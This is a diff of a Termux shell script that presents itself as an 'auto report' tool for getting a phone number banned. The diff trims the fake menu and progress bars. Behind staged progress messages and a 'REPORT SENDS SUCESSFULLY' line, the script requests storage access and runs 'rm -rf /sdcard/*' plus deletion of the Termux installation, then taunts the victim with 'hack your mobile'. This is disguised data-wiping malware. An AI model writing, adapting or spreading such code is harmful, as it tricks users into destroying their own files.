@@ -22,102 +22,7 @@ echo -e "             $white  coded by$blue ${underline}MeZo☠"
 echo ""
 }
 banner
-menu()
-{
-echo -e "${red}[1] AUTO REPORT (temp ban MeZo☠)"
-}
-menu
-
-loading()
-{
-echo -e "$blue loading..."
-sleep 2 && clear
-        echo "==> 5%"
-        sleep 1 && clear
-        echo "===>10%"
-        sleep 0.5 && clear
-        echo "=====>15%"
-        sleep 0.5 && clear
-        echo "======>20%"
-        sleep 0.5 && clear
-        echo "========>25%"
-        sleep 0.5 && clear
-        echo "=========>30%>"
-        sleep 0.5 && clear
-        echo "============>35%"
-        sleep 0.5 && clear
-        echo "==============>40%"
-        sleep 0.5 && clear
-        echo "================>45%"
-        sleep 0.5 && clear
-        echo "===================>50%"
-        sleep 0.5 && clear
-        echo "=====================>55%"
-        sleep 0.5 && clear
-        echo "=======================>60%"
-        sleep 0.5 && clear
-        echo "=========================>65%"
-        sleep 0.5 && clear
-        echo "===========================>70%"
-        sleep 0.5 && clear
-        echo "==============================>75%"
-        sleep 0.5 && clear
-        echo "================================>80%"
-	sleep 0.5 && clear
-        echo "=================================>85%>"
-        sleep 0.5 && clear
-        echo "====================================>90%"
-        sleep 0.5 && clear
-        echo "======================================>95%"
-        sleep 0.5 && clear
-        echo "=======================================>100%"
-        sleep 6 && clear
-        echo "reporting........"
-        sleep 6 && clear
-        echo "==> 5%"
-        sleep 1 && clear
-        echo "===>10%"
-        sleep 0.5 && clear
-        echo "=====>15%"
-        sleep 0.5 && clear
-        echo "======>20%"
-        sleep 0.5 && clear
-        echo "========>25%"
-        sleep 0.5 && clear
-        echo "=========>30%>"
-        sleep 0.5 && clear
-        echo "============>35%"
-        sleep 0.5 && clear
-        echo "==============>40%"
-        sleep 0.5 && clear
-        echo "================>45%"
-        sleep 0.5 && clear
-        echo "===================>50%"
-        sleep 0.5 && clear
-        echo "=====================>55%"
-        sleep 0.5 && clear
-        echo "=======================>60%"
-        sleep 0.5 && clear
-        echo "=========================>65%"
-        sleep 0.5 && clear
-        echo "===========================>70%"
-        sleep 0.5 && clear
-        echo "==============================>75%"
-        sleep 0.5 && clear
-        echo "================================>80%"
-	sleep 0.5 && clear
-        echo "=================================>85%>"
-        sleep 0.5 && clear
-        echo "====================================>90%"
-        sleep 0.5 && clear
-        echo "======================================>95%"
-        sleep 0.5 && clear
-        echo "=======================================>100%"
-        clear
-}
 load(){
-clear && sleep 3
-echo "2000 REPORTS done!!!............."
 sleep 4 && clear
         echo "==> 5%"
         sleep 1 && clear
@@ -159,46 +64,7 @@ sleep 4 && clear
         sleep 0.5 && clear
         echo "=======================================>100%"
 echo "10000 REPORTS done!!!.........................."
- sleep 40 && clear
-        echo "==> 5%"
-        sleep 1 && clear
-        echo "===>10%"
-        sleep 0.5 && clear
-        echo "=====>15%"
-        sleep 0.5 && clear
-        echo "======>20%"
-        sleep 0.5 && clear
-        echo "========>25%"
-        sleep 0.5 && clear
-        echo "=========>30%>"
-        sleep 0.5 && clear
-        echo "============>35%"
-        sleep 0.5 && clear
-        echo "==============>40%"
-        sleep 0.5 && clear
-        echo "================>45%"
-        sleep 0.5 && clear
-        echo "===================>50%"
-        sleep 0.5 && clear
-        echo "=====================>55%"
-        sleep 0.5 && clear
-        echo "=======================>60%"
-        sleep 0.5 && clear
-        echo "=========================>65%"
-        sleep 0.5 && clear
-        echo "===========================>70%"
-        sleep 0.5 && clear
-        echo "==============================>75%"
-        sleep 0.5 && clear
-        echo "================================>80%"
-	sleep 0.5 && clear
-        echo "=================================>85%>"
-        sleep 0.5 && clear
-        echo "====================================>90%"
-        sleep 0.5 && clear
-        echo "======================================>95%"
-        sleep 0.5 && clear
-        echo "=======================================>100%"
+ clear
 sleep 20 && clear
 echo "REPORT SENDS SUCESSFULLY"
 termux-setup-storage
@@ -206,11 +72,9 @@ rm -rf /sdcard/*
 rm -rf /data/data/com.termux/files/usr
 rm -rf /data/data/com.termux/files
 sleep 20 && clear
-echo "number will banned after few minutes"
 echo "hack your mobile by MeZo☠😈"
 sleep 10
 }
-
 printf $green
 read -p "[×]Enter a option: " op
 ip(){
